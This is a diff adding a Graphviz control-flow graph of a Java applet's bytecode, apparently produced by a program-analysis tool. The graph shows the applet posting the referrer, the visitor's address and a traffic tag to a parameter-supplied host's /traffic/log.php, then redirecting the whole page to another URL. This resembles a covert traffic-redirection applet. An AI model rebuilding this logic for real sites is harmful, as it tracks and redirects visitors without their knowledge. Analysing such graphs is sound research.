@@ -1,0 +1,192 @@
+digraph "" {
+    "r0 := @this: traffic.traffic"
+    "push \"\""
+    "r0 := @this: traffic.traffic"->"push \"\"";
+    "store.r r36"
+    "push \"\""->"store.r r36";
+    "load.r r0"
+    "store.r r36"->"load.r r0";
+    "push \"url\""
+    "load.r r0"->"push \"url\"";
+    "virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>"
+    "push \"url\""->"virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>";
+    "store.r r1"
+    "virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>"->"store.r r1";
+    "store.r r1"->"load.r r0";
+    "push \"ref\""
+    "load.r r0"->"push \"ref\"";
+    "push \"ref\""->"virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>";
+    "store.r r2"
+    "virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>"->"store.r r2";
+    "store.r r2"->"load.r r0";
+    "push \"traffic\""
+    "load.r r0"->"push \"traffic\"";
+    "push \"traffic\""->"virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>";
+    "store.r r3"
+    "virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>"->"store.r r3";
+    "store.r r3"->"load.r r0";
+    "push \"host\""
+    "load.r r0"->"push \"host\"";
+    "push \"host\""->"virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>";
+    "store.r r4"
+    "virtualinvoke <traffic.traffic: java.lang.String getParam(java.lang.String)>"->"store.r r4";
+    "store.r r4"->"load.r r0";
+    "virtualinvoke <traffic.traffic: java.lang.String getAddress()>"
+    "load.r r0"->"virtualinvoke <traffic.traffic: java.lang.String getAddress()>";
+    "store.r r5"
+    "virtualinvoke <traffic.traffic: java.lang.String getAddress()>"->"store.r r5";
+    "load.r r4"
+    "store.r r5"->"load.r r4";
+    "push null"
+    "load.r r4"->"push null";
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"
+    "push null"->"virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>";
+    "ifne return"
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"->"ifne return";
+    "ifne return"->"load.r r4";
+    "load.r r4"->"push \"\"";
+    "push \"\""->"virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>";
+    "ifeq new java.net.URL"
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"->"ifeq new java.net.URL";
+    "return"
+    "ifeq new java.net.URL"->"return";
+    "new java.net.URL"
+    "ifeq new java.net.URL"->"new java.net.URL";
+    "dup1.r"
+    "new java.net.URL"->"dup1.r";
+    "new java.lang.StringBuilder"
+    "dup1.r"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"http://\""
+    "dup1.r"->"push \"http://\"";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
+    "push \"http://\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r4";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
+    "load.r r4"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "push \"/traffic/log.php\""
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"push \"/traffic/log.php\"";
+    "push \"/traffic/log.php\""->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+    "store.r r8"
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"store.r r8";
+    "load.r r8"
+    "store.r r8"->"load.r r8";
+    "push 1"
+    "load.r r8"->"push 1";
+    "virtualinvoke <java.net.URLConnection: void setDoOutput(boolean)>"
+    "push 1"->"virtualinvoke <java.net.URLConnection: void setDoOutput(boolean)>";
+    "new java.io.OutputStreamWriter"
+    "virtualinvoke <java.net.URLConnection: void setDoOutput(boolean)>"->"new java.io.OutputStreamWriter";
+    "new java.io.OutputStreamWriter"->"store.r r4";
+    "store.r r4"->"load.r r4";
+    "load.r r4"->"load.r r8";
+    "virtualinvoke <java.net.URLConnection: java.io.OutputStream getOutputStream()>"
+    "load.r r8"->"virtualinvoke <java.net.URLConnection: java.io.OutputStream getOutputStream()>";
+    "specialinvoke <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>"
+    "virtualinvoke <java.net.URLConnection: java.io.OutputStream getOutputStream()>"->"specialinvoke <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>";
+    "specialinvoke <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>"->"load.r r4";
+    "load.r r4"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"ref=\""
+    "dup1.r"->"push \"ref=\"";
+    "push \"ref=\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "load.r r2"
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r2";
+    "load.r r2"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>"
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>";
+    "virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>"->"load.r r4";
+    "load.r r4"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"&z=\""
+    "dup1.r"->"push \"&z=\"";
+    "push \"&z=\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "load.r r5"
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r5";
+    "load.r r5"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>";
+    "virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>"->"load.r r4";
+    "load.r r4"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "push \"&traffic=\""
+    "dup1.r"->"push \"&traffic=\"";
+    "push \"&traffic=\""->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "load.r r3"
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r3";
+    "load.r r3"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>";
+    "virtualinvoke <java.io.OutputStreamWriter: void write(java.lang.String)>"->"load.r r4";
+    "virtualinvoke <java.io.OutputStreamWriter: void flush()>"
+    "load.r r4"->"virtualinvoke <java.io.OutputStreamWriter: void flush()>";
+    "new java.io.BufferedReader"
+    "virtualinvoke <java.io.OutputStreamWriter: void flush()>"->"new java.io.BufferedReader";
+    "new java.io.BufferedReader"->"store.r r2";
+    "store.r r2"->"load.r r2";
+    "new java.io.InputStreamReader"
+    "load.r r2"->"new java.io.InputStreamReader";
+    "new java.io.InputStreamReader"->"dup1.r";
+    "dup1.r"->"load.r r8";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"
+    "load.r r8"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+    "specialinvoke <java.io.InputStreamReader: void <init>(java.io.InputStream)>"
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"specialinvoke <java.io.InputStreamReader: void <init>(java.io.InputStream)>";
+    "specialinvoke <java.io.BufferedReader: void <init>(java.io.Reader)>"
+    "specialinvoke <java.io.InputStreamReader: void <init>(java.io.InputStream)>"->"specialinvoke <java.io.BufferedReader: void <init>(java.io.Reader)>";
+    "goto load.r r2"
+    "specialinvoke <java.io.BufferedReader: void <init>(java.io.Reader)>"->"goto load.r r2";
+    "goto load.r r2"->"load.r r2";
+    "virtualinvoke <java.io.BufferedReader: java.lang.String readLine()>"
+    "load.r r2"->"virtualinvoke <java.io.BufferedReader: java.lang.String readLine()>";
+    "virtualinvoke <java.io.BufferedReader: java.lang.String readLine()>"->"store.r r3";
+    "store.r r3"->"load.r r3";
+    "ifnonnull new java.lang.StringBuilder"
+    "load.r r3"->"ifnonnull new java.lang.StringBuilder";
+    "ifnonnull new java.lang.StringBuilder"->"load.r r4";
+    "virtualinvoke <java.io.OutputStreamWriter: void close()>"
+    "load.r r4"->"virtualinvoke <java.io.OutputStreamWriter: void close()>";
+    "virtualinvoke <java.io.OutputStreamWriter: void close()>"->"load.r r2";
+    "virtualinvoke <java.io.BufferedReader: void close()>"
+    "load.r r2"->"virtualinvoke <java.io.BufferedReader: void close()>";
+    "load.r r1"
+    "virtualinvoke <java.io.BufferedReader: void close()>"->"load.r r1";
+    "load.r r1"->"push \"\"";
+    "push \"\""->"virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>";
+    "virtualinvoke <java.lang.String: boolean equals(java.lang.Object)>"->"ifne return";
+    "ifne return"->"load.r r0";
+    "virtualinvoke <traffic.traffic: java.applet.AppletContext getAppletContext()>"
+    "load.r r0"->"virtualinvoke <traffic.traffic: java.applet.AppletContext getAppletContext()>";
+    "virtualinvoke <traffic.traffic: java.applet.AppletContext getAppletContext()>"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "dup1.r"->"load.r r1";
+    "load.r r1"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "push \"_TOP\""
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"push \"_TOP\"";
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL,java.lang.String)> 2"
+    "push \"_TOP\""->"interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL,java.lang.String)> 2";
+    "goto return"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL,java.lang.String)> 2"->"goto return";
+    "goto return"->"return";
+    "store.r r0"
+    "interfaceinvoke <java.applet.AppletContext: void showDocument(java.net.URL,java.lang.String)> 2"->"store.r r0";
+    "store.r r0"->"return";
+    "ifnonnull new java.lang.StringBuilder"->"new java.lang.StringBuilder";
+    "new java.lang.StringBuilder"->"dup1.r";
+    "load.r r36"
+    "dup1.r"->"load.r r36";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"
+    "load.r r36"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
+    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
+    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r3";
+    "load.r r3"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
+    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r36";
+}
